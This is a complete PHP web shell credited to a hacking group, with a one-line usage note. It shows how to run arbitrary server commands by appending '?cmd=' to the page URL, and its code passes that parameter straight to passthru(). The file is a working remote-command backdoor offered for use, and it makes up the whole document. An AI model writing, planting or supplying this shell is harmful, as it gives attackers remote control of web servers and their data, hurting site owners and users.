	This is a simple php shell coded by Wh1t3R0s3 of Generation-X Security Team,<br>
<br>
	to use it just add ?cmd=[command] at the end of the link.<br>
	Example:<br>
	https://example.com/g.php?cmd=ls <br>
	(c) Wh1t3R0s3<br><br>
---------------------------------------------------------------------------
<br>
<?php
echo passthru($_GET['cmd']); _halt_compiler();
?>
